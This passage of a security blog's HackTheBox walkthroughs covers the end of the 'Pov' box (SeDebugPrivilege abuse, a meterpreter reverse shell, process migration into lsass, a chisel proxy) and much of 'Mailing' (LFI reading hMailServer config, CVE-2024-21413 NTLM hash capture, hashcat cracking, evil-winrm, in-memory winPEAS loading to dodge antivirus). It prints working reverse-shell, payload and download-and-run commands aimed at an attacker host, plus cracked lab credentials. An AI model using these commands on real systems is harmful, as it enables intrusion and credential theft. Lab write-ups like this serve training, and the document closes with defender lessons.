&#x261d;&#xfe0f; An alternative would have been to compile the original GhostPack source. This could be done with xbuild, now that I have mono installed.
I&rsquo;ll run the binary directly off my SMB share:
X:\\SharpUp.exe audit Well, I wanted thinned-down resuls&hellip; And I sure got them &#x1f602;
Probably a good idea to look into the literally one thing that was reported by the privesc script, right?
According to this section of the Abusing Tokens page on Hacktricks, I might be able to use just SeDebugPrivilege to privesc:
This privilege permits the debug other processes, including to read and write in the memore. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege.
That sounds perfect. I&rsquo;ll try out the psgetsys.ps1 script referenced in that section. Again, I&rsquo;ll run directly from the SMB share:
It doesn&rsquo;t like that the script isn&rsquo;t digitally-signed. We can get past this by setting the execution policy:
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser Trying it again, it seems like it runs fine. The script should actually be used like this:
# Get the PID of a process running as NT SYSTEM import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;) i.e. before we can use this, we need to find a PID of a process running as NT SYSTEM.
tasklist /v | findstr &#34;NT AUTHORITY&#34; Hmm&hellip; The only result is the System Idle Process at PID 0. I doubt that will work. I guess I could try it though:
import-module X:\\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(0,&#34;whoami&#34;) That&rsquo;s odd. It should at least be able to run the code, even if the PID was invalid. I&rsquo;ll check the script:
Aha, ok. The instructions on Hacktricks seem incorrect. I&rsquo;ll try using it as shown above:
Just in case I can get this to work, I&rsquo;ll start up a reverse shell listener on port 4447:
sudo ufw allow from $RADDR to any port 4447 proto tcp rlwrap nc -lvnp 4447 ipmo .\\psgetsys.ps1; ImpersonateFromParentPid -ppid 664 -command &#34;C:\\Users\\Public\\Downloads\\nc.exe 10.10.14.22 4447 -e cmd.exe&#34; That&rsquo;s not quite it&hellip;
ipmo .\\psgetsys.ps1; ImpersonateFromParentPid -ppid 664 -command &#34;C:\\Users\\Public\\Downloads\\nc.exe&#34; -cmdargs &#34;10.10.14.22 4447 -e cmd.exe&#34; There we go, it seems to require the args. I still can&rsquo;t manage to get this to do anything, though&hellip;. hmm.
After dozens of iterations of trying to use psgetsys.ps1, I resorted to checking the HTB forums. Someone else was kind enough to mention that they had a similar problem, and how they got themselves out of it:
Root: It should be immediately obvious what you can do but I still spent a lot of time trying various payloads and techniques and I could not for the life of me to get any to work, I ended up using meterpreter and migrating feels like cheating. &#x1f626;
That&rsquo;s a solid hint. I&rsquo;ll start up a meterpreter shell instead.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4447 -a x64 -f exe -o reverse_shell.exe msfconsole &gt; use exploit/multi/handler &gt; set payload windows/x64/meterpreter/reverse_tcp &gt; set LHOST tun0 &gt; set LPORT 4447 &gt; run Now from the target, let&rsquo;s open the reverse shell using reverse_shell.exe:
X:\\reverse_shell.exe Moments later, we get the meterpreter shell we wanted:
&#x261d;&#xfe0f; Note: to switch back to meterpreter after entering shell, just type exit
In my original (alaading) reverse shell, I identified a PID that I had used with psgetsys.ps1 - the PID of lsass.exe, which was 664 for me. Let&rsquo;s use the meterpreter session to &ldquo;migrate&rdquo; to this PID:
meterpreter&gt; migrate 664 Wow, that person from the forums was right. That was so easy that it felt like cheating &#x1f605;
And there&rsquo;s the root flag! Just type it out to get those root flag points &#x1f352;
type C:\\Users\\Administrator\\Desktop\\root.txt Chisel SOCKS Proxy During user enumeration I found a locally-exposed port 5432 (probably PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse --key s4ucys3cret Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test (attacker -&gt; target -&gt; attacker) to access loading the index page from my local python webserver hosting my toolbox:
proxychains whatweb http://10.10.14.2:8000 Success &#x1f44d;
Finally, this worked, and I was able to cat out the flag for those glorious root flag points &#x1f4b0;
cat /root/root.txt CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space. Also I have a few tools to get rid of:
cd exploit rm winPEASany.exe SharpUp.exe RunasCs.exe reverse_shell.exe nc.exe psgetsys.ps1 socatx* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; EXTRA CREDIT Checking out the Webserver I was curious to see the structure of the webserver, now that I have nt authority/system. As expected, I found it inside C:\\inetpub\\wwwroot\\:
The important stuff is inside the dev directory:
Here&rsquo;s portfolio, what we mostly interacted with:
There was a contact.aspx? I didn&rsquo;t even realize that. Huh, interesting. Let&rsquo;s check out its source code in contact.aspx.cs:
using System; using System.Collections.Generic; using System.Web; using System.Web.UI; using System.Web.UI.WebControls; using System.Text.RegularExpressions; using System.Text; using System.IO; public partial class contact : System.Web.UI.Page { protected void Page_Load(object sender, EventArgs e) { } protected void Submit(object sender, EventArgs e) { } } Ah, OK. It doesn&rsquo;t actually do anything &#x1f60c;
LESSONS LEARNED Attacker &#x2708;&#xfe0f; ZAP&rsquo;s &ldquo;HUD&rdquo; tool is incredible! This is the first box I&rsquo;ve actually utilized it on&hellip; and wow - I was completely blown away. It took me a matter of seconds to realize the inner workings of the /portfolio page and locate the LFI opportunity. I would highly recommend using this tool for any web target, at least for a few minutes. It also really cuts down on the amount of &ldquo;clicks&rdquo; you need to do when playing around with proxied requests.
&#x1f4dc; Use as many privesc scripts as you want. They each have their strengths and weaknesses. On this box, I used winPEAS to gain a very broad view of the whole privesc surface; it was helpful, but a lot of information. Then right afterwards I used SharpUp.exe to find exactly the privesc vector I needed, with zero noise. On a CTF, it&rsquo;s good to know how to enumerate manually, but using scripts is a huge advantage for speed and breadth.
&#x1f981; After foothold, run your tools out of SMB if you can. It&rsquo;s super convenient! This saves a lot of tedious moving-around of files.
&#x1f60a; Don&rsquo;t feel bad about using metasploit. Anyone who&rsquo;s tried to train for OSCP has a bias against using metasploit. I&rsquo;m starting to believe that&rsquo;s actually just Rapid7 trying to market their tool and build hype. In reality, a smart attacker will obviously use whatever tools they have available. So why not be a smart attacker?
&#x1f500; If you&rsquo;re utilizing SeDebugPrivilege, you&rsquo;ll also need to migrate the process. There are a few ways to migrate, but by far the easiest is to just user meterpreter.
Defender &#x1f926;&zwj;&#x2640;&#xfe0f; Use well-tested regexes. This box opened itself up to an LFI in at least two ways. However, using a proper regex on the filepath could have actually prevented both of them, and stopped the LFI in its tracks. Use a well-documented regex library like on https://www.regexlib.com/. It&rsquo;ll save you time as a developer, and provide better security.
&#x1f915; Mitigations are not solutions. I know, that sounds too broad, right? An illustrative example is the usage of ASP.NET&rsquo;s VIEWSTATE on this box. There are mitigations for compromise that were already in place: encryption and verification of the VIEWSTATE. Those mitigations by themselves are effective, but they do not address the underlying vulnerability: insecure deserialization (of an object controlled by an untrusted entity!). All it took was chaining this vulnerability to another, much simpler one - the LFI. The lesson here is that you can&rsquo;t just patch up one hole and assume that fixed your total security.
&#x26d4; Nobody should have the SeDebugPrivilege. At most, this priv should be granted only temporarily, and within one session only.
&#x1f645; Secure String is a highly misleading term. At best, it&rsquo;s a tool for preventing reading of a stored credential remotely. However, if the intruder is already inside the system, using a &ldquo;secure string&rdquo; is about as &ldquo;secure&rdquo; as storing a plaintext credential. If you ask me, this is strictly a convenience feature for administrators, and provides no security benefit.
`,url:"https://4wayhandshake.github.io/walkthrough/pov/"},"https://4wayhandshake.github.io/walkthrough/mailing/":{title:"Mailing",tags:["Email","hMailServer","LFI","NTLM Hash","Password Cracking","Manual Local Enumeration","Mimikatz","Dumping the SAM"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Mailing was released as the third box of HTB&rsquo;s Season 5, Anomalies. The box is initially about a mail server (although that ceases to be important after a foothold is achieved).
To gain a foothold, you need to make some major assumptions using a &ldquo;guess and check&rdquo; procedure that is not easily automated. The foothold is possible by means of exploiting a CVE for an application that you can&rsquo;t be sure is even running on the target. Moreover, the exploit requires user interaction, which you can&rsquo;t be sure is even happening.
Along the way to root, you&rsquo;re thwarted by an AV that stops you from enumerating the box fully. Lack of viable enumeration techniques leaves you constantly having to make assumptions about how the box might work, then spend a long time verifying those assumptions. Even after researching the target&rsquo;s vulnerable software, you don&rsquo;t really have any indication that you&rsquo;ve found the right vulnerability - once again reverting to this mind-numbing &ldquo;guess and check&rdquo; procedure.
In the end, Mailing leaves you wanting to reach a certain goal, but with no realistic way to test the individual steps between you and your goal. Extremely frustrating, would not recommend! &#x1f44e;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 25/tcp open smtp 80/tcp open http 110/tcp open pop3 135/tcp open msrpc 139/tcp open netbios-ssn 143/tcp open imap 445/tcp open microsoft-ds 465/tcp open smtps 587/tcp open submission 993/tcp open imaps 5040/tcp open unknown 5985/tcp open wsman 7680/tcp open pando-pub 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 63910/tcp open unknown I&rsquo;m seeing SMTP(S), IMAP(S), POP3, etc. Seems like all the usual suspects mail.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 25/tcp open smtp hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Did not follow redirect to http://mailing.htb |_http-server-header: Microsoft-IIS/10.0 110/tcp open pop3 hMailServer pop3d |_pop3-capabilities: TOP USER UIDL 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 143/tcp open imap hMailServer imapd |_imap-capabilities: IMAP4rev1 CHILDREN CAPABILITY NAMESPACE RIGHTS=texkA0001 completed QUOTA OK ACL SORT IDLE IMAP4 445/tcp open microsoft-ds? 465/tcp open ssl/smtp hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU | Not valid before: 2024-02-27T18:24:10 |_Not valid after: 2029-10-06T18:24:10 587/tcp open smtp hMailServer smtpd |_ssl-date: TLS randomness does not represent time | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU | Not valid before: 2024-02-27T18:24:10 |_Not valid after: 2029-10-06T18:24:10 993/tcp open ssl/imap hMailServer imapd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU | Not valid before: 2024-02-27T18:24:10 |_Not valid after: 2029-10-06T18:24:10 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp open pando-pub? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 63910/tcp open msrpc Microsoft Windows RPC Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-05-05T10:50:52 |_ start_date: N/A |_clock-skew: 2m15s Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR None of the top 100 UDP ports were detected as open.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=mailing.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR The target is using IIS for its web server.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from that. Now I&rsquo;ll check for subdomains of mailing.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Still no results. I&rsquo;ll move on to directory enumeration on http://mailing.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e .php,.asp,.js,.html -timeout 4 -v Directory enumeration gave the following:
Exploring the Website The index page of the website gives some helpful hints. As expected, it&rsquo;s definitely a mail server. Also, we now know it&rsquo;s using hMailServer.
There&rsquo;s a button at the bottom that reminds me I should investigate LFI &#x1f6a9;
The instructions outline how to configure a mail client and connect an account. They are pretty straightforward - Basically just use default settings and autodetect everything. It outlines how to use both Windows Mail and Thunderbird with mailing.htb.
The instructions use a test account user : password; I tried replicating their process, using that test account (in case they left the account enabled), but didn&rsquo;t have any luck:
When clicking &ldquo;Done&rdquo; there is a failure to authenticate. Looks like I&rsquo;ll need to obtain some real credentials.
Vulnerability research After a little bit of checking to see if there were any vulnerabilities for hMailServer, I didn&rsquo;t find anything substantial. Definitely nothing current. There might still be a misconfiguration, but I don&rsquo;t see any CVEs.
The instructions.pdf document showed us that the organization suggests we use either Windows Mail or Thunderbird. Thankfully, a quick google search of &ldquo;windows mail vulnerability CVE exploit&rdquo; shows some juicy results&hellip; It looks like there is a very new and very critical CVE (CVE-2024-21413, CVSS 9.8 &#x1f631; ) that people are calling the MonikerLink Bug. This is definitely worth investigating.
I found this article describing how they were able to exploit this vulnerability to obtain NTLM hashes. Apparently, all I need to do is send an email to the target that contains a maliicous link. The link should force the target to connect back to my attacker box, transmitting its NTLM hash to me. Truly horrifying!
Unfortunately though, without any valid smtp credentials I won&rsquo;t be able to send such an email.
Checking for LFI As a first attempt for LFI, I&rsquo;ll start with a list of files commonly found on Windows. If I want to refine this, I&rsquo;ll try adding some more, such as files important for hMailServer or IIS. I&rsquo;m using my tool Alfie to check for files rapidly. Many other fuzzing tools, such as ffuf or wfuzz, would work fine too.
The Windows files start at roughly line 895
FILES_LIST=/home/kali/Box_Notes/Mailing/lfi_files_unique.txt LFI_LIST=/home/kali/Box_Notes/Mailing/lfi_list.txt tail -n +895 /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt | sort | uniq &gt; $FILES_LIST echo &#39;index.php&#39; &gt;&gt; $FILES_LIST; echo &#39;download.php&#39; &gt;&gt; $FILES_LIST; echo &#39;../&#39; &gt; $LFI_LIST; echo &#39;..\\&#39; &gt;&gt; $LFI_LIST; python3 alfie.py -f $FILES_LIST -w $LFI_LIST -u &#39;http://mailing.htb/download.php?file=&#39; -fs 15 -nx --min 0 --max 4 -t 60 --timeout 10 I tried navigating to that URL, and indeed I obtained index.php:
The contents are only html, but as a proof-of-concept for the LFI, this is a great start:
FOOTHOLD hMailServer Configs OK let&rsquo;s try refining this a little. It probably makes sense to try to find some of the configuration files for hMailServer too. But what would those be? A little bit of reading documentation revealed that a really important file is C:\\Program Files\\hMailServer\\hMailServer.ini, and a couple others as well. In addition, we don&rsquo;t know which Program Files it wil be in, :
echo &#39;C:\\Program Files\\hMailServer\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\ProgramFiles\\hMailServer\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\programfiles\\hmailserver\\hmailserver.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files (x86)\\hMailServer\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\program files (x86)\\hmailserver\\hmailserver.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\ProgramFiles(x86)\\hMailServer\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\programfiles(x86)\\hmailserver\\hmailserver.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files\\hMailServer\\Bin\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files (x86)\\hMailServer\\Bin\\hMailServer.ini&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files\\hMailServer\\Data\\hMailServer.xml&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files (x86)\\hMailServer\\Data\\hMailServer.xml&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files\\hMailServer\\Events\\hMailServer.EventHandlers.vbs&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\Program Files (x86)\\hMailServer\\Events\\hMailServer.EventHandlers.vbs&#39; &gt;&gt; $FILES_LIST; echo &#39;C:\\WINDOWS\\System32\\drivers\\etc\\hosts&#39; &gt;&gt; $FILES_LIST; I noticed that there were a bunch of filenames ending in spaces, so I&rsquo;ll remove those; I&rsquo;ll also append to my files list a copy of the current files, except with the C:\\ removed from each file.
sed -i &#39;/ $/d&#39; $FILES_LIST; grep -E &#39;^C:\\\\&#39; $FILES_LIST | sed &#39;s/C:\\\\//g&#39; &gt;&gt; $FILES_LIST; grep &#39; &#39; $FILES_LIST | sed &#39;s/ /+/g&#39; &gt;&gt; $FILES_LIST; grep &#39; &#39; $FILES_LIST | sed &#39;s/ /%20/g&#39; &gt;&gt; $FILES_LIST; I changed max to 2 because I ran it with 6 and found repetetive results - i.e. just to make the screenshot smaller &#x1f609;
python3 alfie.py -f $FILES_LIST -w $LFI_LIST -u &#39;http://mailing.htb/download.php?file=&#39; -fs 15 -nx --min 0 --max 2 -t 60 --timeout 15 Alright! That&rsquo;s more like it &#x1f609; Let&rsquo;s take a look at that hMailServer.ini file and see what&rsquo;s inside.
The contents are exactly what I was hoping for:
[Directories] ProgramFolder=C:\\Program Files (x86)\\hMailServer DatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database DataFolder=C:\\Program Files (x86)\\hMailServer\\Data LogFolder=C:\\Program Files (x86)\\hMailServer\\Logs TempFolder=C:\\Program Files (x86)\\hMailServer\\Temp EventFolder=C:\\Program Files (x86)\\hMailServer\\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 [Database] Type=MSSQLCE Username= Password=0a9f8ad8bf896b501dde74f08efd7e4c PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1 The directory paths are really helpful info, but my eyes immediately went to those two hashes. I put them into a file, hashes.txt:
admin:841bb5acfa6779ae432fd7a4e6600ba7 database:0a9f8ad8bf896b501dde74f08efd7e4c From the official documentation about hMailServer.ini, we know the purpose of this password:
AdministratorPassword - The main hMailServer administration password. The user for example needs to enter this password when starting hMailServer Administrator. This password is encoded using MD5.
Excellent! From what I can tell, this password is intended for the PHPWebAdmin interface: homenetworkingadministrator
Finding some usernames I would love to quickly check this password with winrm, and some other remote login tools, to see if the admin user has re-used credentials&hellip; but I&rsquo;m not actually sure what users are on the target box. Thankfully, there is a hint on the last page of the instructions.pdf document linked from the index page:
That shows that one of the users is maya@mailing.htb
Aside from that, there are techniques for enumerating mail servers that come in handy for this box. From the Hacktricks IMAP page, we can grab the IMAPS certificate:
openssl s_client -connect $RADDR:993 -quiet Likewise, we can get the SMTPS certificate:
openssl s_client -starttls smtp -crlf -connect mailing.htb:587 These both show that another user is ruy@mailing.htb.
Both of these users are expected, given the &ldquo;staff&rdquo; shown on the index page.
Credential Reuse Now that I have a couple usernames, I&rsquo;ll try them with crackmapexec to see if I get lucky:
crackmapexec winrm -u &#39;ruy&#39; -p &#39;homenetworkingadministrator&#39; $RADDR crackmapexec winrm -u &#39;maya&#39; -p &#39;homenetworkingadministrator&#39; $RADDR crackmapexec smb -u &#39;ruy&#39; -p &#39;homenetworkingadministrator&#39; $RADDR crackmapexec smb -u &#39;maya&#39; -p &#39;homenetworkingadministrator&#39; $RADDR Unfortunately, none of those worked.
What about logging into the mail server itself?
curl -k &#34;imaps://$RADDR/INBOX?ALL&#34; --user ruy:homenetworkingadministrator curl -k &#34;imaps://$RADDR/INBOX?ALL&#34; --user maya:homenetworkingadministrator curl &#34;imap://$RADDR/INBOX?ALL&#34; --user ruy:homenetworkingadministrator curl &#34;imap://$RADDR/INBOX?ALL&#34; --user maya:homenetworkingadministrator No, none of those worked either.
Next, I&rsquo;m going to try Thunderbird itself:
That login with Maya didn&rsquo;t work, same with Ruy. But the the hMailServer.ini file referenced the variable &ldquo;AdministratorPassword&rdquo; - so maybe there&rsquo;s an administrator@mailing.htb?
Yep, there is&hellip; It worked perfectly with no modification to settings. Just use the autodetected defaults.
&#x1f389; I tried sending an email to Ruy and Maya, and it worked! That shows that I&rsquo;ve authenticated successfully to both IMAP and SMTP. But even more important, I now have a valid credential to try CVE-2024-21413 with.
USER FLAG CVE-2024-21413 As described in this article, I&rsquo;m going to try to catch an SMB request to an attacker controlled &ldquo;SMB resource&rdquo; (I&rsquo;ll actually be running Responder)
First, I&rsquo;ll open up the firewall for the target:
sudo ufw allow from $RADDR to any port 445 sudo responder -I tun0 Then I crafted an email using the filter bypass that the CVE describes:
That didn&rsquo;t seem to work. However, when I included the link in a different way, it worked perfectly!
Shortly after sending that, I saw a bunch of NTLMv2 hashes appear from maya:
Just to double-check, I tried running it through name-that-hash:
I copy-pasted each of those hashes onto separate lines in the file maya_ntlm_hashes.txt and ran hashcat over it:
hashcat -m 5600 maya_ntlm_hashes.txt /usr/share/wordlists/rockyou.txt Within a few seconds, hashcat cracked the hashes!
Excellent, so we now have a windows credential for maya : m4y4ngs4ri
Now that I have a valid credential, let&rsquo;s try evil-winrm again:
Perfect! We finally have a shell &#x1f601; The flag is at C:\\Usrs\\maya\\Desktop\\user.txt; go type it out for some points!
ROOT FLAG WinPEAS Let&rsquo;s run WinPEAS and see what it finds. First, I&rsquo;ll need to transfer it over (or run it from memory, but this is easier). For file transfer, I&rsquo;ll use impacket-smbserver:
sudo ufw allow from $RADDR to any port 53,139,445 proto tcp cd ~/Tools/WINDOWS impacket-smbserver -username &#39;kali&#39; -password &#39;testtesttest&#39; share . Then, from the evil-winrm, as maya:
net use x: \\\\10.10.14.14\\share /user:kali testtesttest # Denied! target refuses to use SMBv1 &#x261d;&#xfe0f; Edit: I could have just enabled SMBv2 instead:
impacket-smbserver -smb2support -username &#39;kali&#39; -password &#39;testtesttest&#39; share . net use x: \\\\10.10.14.14\\share /user:kali testtesttest copy X:\\winPEAS.ps1 C:\\Users\\maya\\Downloads\\winPEAS.ps1 Hmm, alright. How else can I move WinPEAS over?
where wget #nope where curl #nope $url = &#34;http://10.10.14.14:8000/winPEASany_ofs.exe&#34; (New-Object Net.WebClient).DownloadFile($url, &#39;C:\\Users\\maya\\Downloads\\winpeas.exe&#39;) ..\\Downloads\\winpeas.exe Looks like the AV didn&rsquo;t like that&hellip; Maybe I can run it directly from memory to evade the AV?
$url = &#34;http://10.10.14.14:8000/winPEASany_ofs.exe&#34; $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest &#34;$url&#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(&#34;&#34;) Alright. I guess I&rsquo;ll have to do my privilege escalation enumeration manually!
SMB as maya Before I go any further with enumeration, it&rsquo;s probably prudent to check out SMB now that I have a credential. Since SMB is exposed on the network, I&rsquo;ll log in from my attacker machine:
impacket-smbclient maya:m4y4ngs4ri@mailing.htb There&rsquo;s a share inside called Important Documents, but it&rsquo;s empty.
Also, for some reason we&rsquo;re actually able to read the IPC$ share. Oddly enough, there&rsquo;s an exposed LSASS:
I&rsquo;m no expert but I think that means that, if I were able to gain an NTLM hash for someone else, I could use Mimikatz to do LSASS injection and impersonate that user. I should keep an eye out for ways to gain another hash!
Local enumeration: maya I wanted a good reference of steps to consider when going through local enumeration on Windows, so I&rsquo;ll be recording every step.
systeminfo # access denied [System.Environment]::OSVersion.Version net user net user maya whoami /priv I&rsquo;ll try listing the services running
wmic service list full # Access denied Get-Service | Where-Object { $_.Status -eq &#39;Running&#39; } # Access denied tasklist # Access denied Thankfully, we can still look for scheduled tasks:
schtasks /query /fo LIST /v There are three scheduled tasks that stand out (they&rsquo;re right at the top of the list).
One of them runs mail.vbs at login:
Another runs mail.py, also at login:
And finally, one that localadmin executes, running C:\\User\\localadmin\\Documents\\scripts\\soffice.ps1:
Unfortunately, I can&rsquo;t see the contents of C:\\User\\localadmin\\Documents\\scripts\\soffice.ps1. Otherwise would happily label this as a privesc vector. For now, I&rsquo;ll keep it in the back of my mind.
Scripts in Documents There are two scripts in Maya&rsquo;s Documents:
These scripts appear to perform the link-clicking that was required to trigger our exploit to gain Maya&rsquo;s NTLM hash.
These scripts are ran upon login and startup by the scheduled tasks shown in the images in the previous section
This is mail.py:
from pywinauto.application import Application from pywinauto import Desktop from pywinauto.keyboard import send_keys from time import sleep app = Application(backend=&#34;uia&#34;).connect(title_re=&#34;Inbox*&#34;) dlg = app.top_window() current_count = 0 remove = 2 while True: try: unread = dlg.InboxListBox items = unread.item_count() if items==1: sleep(20) continue if items != current_count: for i in range(1,items-current_count-(remove-1)): if &#34;Yesterday&#34; in unread.texts()[i][0]: remove = 3 continue unread[i].select() message = dlg.child_window(auto_id=&#34;RootFocusControl&#34;, control_type=&#34;Document&#34;).Hyperlink.invoke() sleep(45) dlg.type_keys(&#34;{ENTER}&#34;) unread[i].select() current_count = items - remove sleep(20) except: pass And here&rsquo;s mail.vbs:
Set objShell = CreateObject(&#34;WScript.Shell&#34;) objShell.Run &#34;explorer shell:AppsFolder\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe!microsoft.windowslive.mail&#34; WScript.Sleep 5000 objShell.AppActivate &#34;Mail&#34; WScript.Sleep 1000 objShell.SendKeys &#34;{F5}&#34; WScript.Sleep 500 objShell.SendKeys &#34;{ENTER}&#34; WScript.Sleep 500 objShell.SendKeys &#34;{TAB}&#34; WScript.Sleep 500 objShell.SendKeys &#34;{ENTER}&#34; WScript.Sleep 500 objShell.SendKeys &#34;{ENTER}&#34; WScript.Sleep 500 objShell.SendKeys &#34;^d&#34; WScript.Sleep 500 objShell.SendKeys &#34;%{F4}&#34; Exploring the filesystem Now that I have a shell as maya, I can explore the rest of the filesystem. I started, as one does, at the root of the C drive:
There&rsquo;s the Important Documents folder that we saw when checking out SMB. Still unclear why it exists&hellip;
It&rsquo;s empty. Maya has modification perms but not full control. Other than that, there&rsquo;s wwwroot to check out, but I don&rsquo;t have read access to it as Maya.
My next stop was Program Files (x86) to check out the hMailServer files:
This reminded me that I never checked the database - If I can gain access to that, then I might have a clue about moving forward.
Checking tree, I noticed that there were some unexpected files in there. Under the Data folder, I found a bunch of automatically named files. I opened one up:
That&rsquo;s one of the emails that I sent as a test!
I went into the Data directory for maya and read all of her emails too:
cd ..\\maya gci -Recurse | Get-Content What followed was an explosion of emails on my screen, showing everyone&rsquo;s attempts to use CVE-2024-21413.
It&rsquo;s shocking how many people inserted an image into their payloads. I wonder why they did that? Upon closer inspection, it&rsquo;s the same image in all of these&hellip; They must have been using some publicly available PoC script.
I took the base64-encoded image from their payloads and popped it into an html file:
It&rsquo;s the Microsoft logo! Did you all request permission to use their trademark without permission?! &#x1f631;
